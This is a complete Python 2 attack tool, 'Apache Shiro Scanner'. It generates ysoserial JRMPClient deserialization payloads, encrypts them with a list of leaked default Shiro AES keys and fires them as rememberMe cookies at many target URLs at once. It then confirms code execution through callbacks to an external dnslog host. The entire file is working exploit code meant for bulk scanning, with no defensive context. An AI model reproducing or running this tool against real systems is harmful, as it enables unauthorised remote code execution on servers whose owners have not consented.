#!/usr/bin/env python
# -*- encoding: utf-8 -*-

import os
import re
import base64
import uuid,time
import subprocess
import requests,sys
from Crypto.Cipher import AES
import random,argparse,Queue,threading
import warnings


warnings.filterwarnings("ignore")
JAR_FILE = './ysoserial-0.0.6-SNAPSHOT-all.jar'
scan_count = 0
vuln_count = 0

def poc(url, rce_command,key_):
    if '://' not in url:
        target = 'https://%s' % url if ':443' in url else 'http://%s' % url
    else:
        target = url
    try:
        payload = generator(rce_command, JAR_FILE,key_) # 生成payload
        r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10,verify=False)  # 发送验证请求
        # print r.text
    except Exception, e:
        return True
    return True


def generator(command, fp,key_):
    if not os.path.exists(fp):
        raise Exception('jar file not found!')
    popen = subprocess.Popen(['java', '-jar', fp, 'JRMPClient', command],
                             stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key_), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

#取得随机数
def random_str(len):
    str1 = ""
    for i in range(len):
        str1 += (random.choice("QWERTYUIOPASDFGHJKLZXCVBNM1234567890"))
    return str(str1)

#查看dnslog状态
def getdnslog(random_str):
    dns_check = 'https://admin.dnslog.link/api/dns/xxxxxxx/%s/' % random_str#xxxxxxx为dnslog地址
    res = requests.get(dns_check)
    return res.text.strip()

#检查是否执行dnslog成功
def check_vuln():
    key = {
    'kPH+bIxk5D2deZiIxcaaaA==',
    'wGiHplamyXlVB11UXWol8g==',
    '2AvVhdsgUs0FSA3SDFAdag==',
    '4AvVhmFLUs0KTA3Kprsdag==',
    'fCq+/xW488hMTCD+cmJ3aQ==',
    '3AvVhmFLUs0KTA3Kprsdag==',
    '1QWLxg+NYmxraMoxAXu/Iw==',
    'ZUdsaGJuSmxibVI2ZHc9PQ==',
    'Z3VucwAAAAAAAAAAAAAAAA==',
    'U3ByaW5nQmxhZGUAAAAAAA==',
    'wGiHplamyXlVB11UXWol8g==',
    '6ZmI6I2j5Y+R5aSn5ZOlAA=='
    }
    global scan_count,vuln_count
    while True:
        try :
            web_url = queue.get(timeout=0.1)
            scan_count+=1
        except:
            break
        try:
            
            for key_ in key:
                random_str_ = random_str(8)
                connect = poc(web_url,random_str_+".xxxxxxx.dnslog.link",key_)#xxxxxxx为dns地址
                if connect == False:
                    break
                result = getdnslog(random_str_)
                # print result,random_str_,key_
                if result == 'True':
                    print "[+200] vuln apache shiro",web_url,key_
                    vuln_count+=1
                    break
                else:
                    pass
        except Exception,e:
            pass

if __name__ == '__main__':
    parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter,
                                    description='Apache Shiro Scanner.By Stu.',
                                    usage='scan.py [optional]')
    parser.add_argument('-f',metavar='File',type=str,default='url.txt',help='Put Web url in url.txt')
    parser.add_argument('-u',metavar='Url',type=str,help='Put a Web url')
    parser.add_argument('-t',metavar='THREADS',type=int,default='10',help='Num of scan threads,default 100')

    if len(sys.argv)==1:
        sys.argv.append('-h')
    args = parser.parse_args()
    start_time = time.time()
    if args.u is None:
    #将url放入队列
        queue = Queue.Queue()
        for web_url in open(args.f).xreadlines():
            web_url = web_url.strip() 
            if not web_url:
                continue
            queue.put(web_url)

        #开启多线程访问
        threads = []
        for i in range(args.t):
            t = threading.Thread(target=check_vuln)
            threads.append(t)
            t.start()

        for t in threads:
            t.join()
    else:
        queue = Queue.Queue()
        queue.put(args.u)
        check_vuln()
    print ('[+]Done. %s weburl scanned %s available %.1f seconds.' % (scan_count,vuln_count,time.time() - start_time))

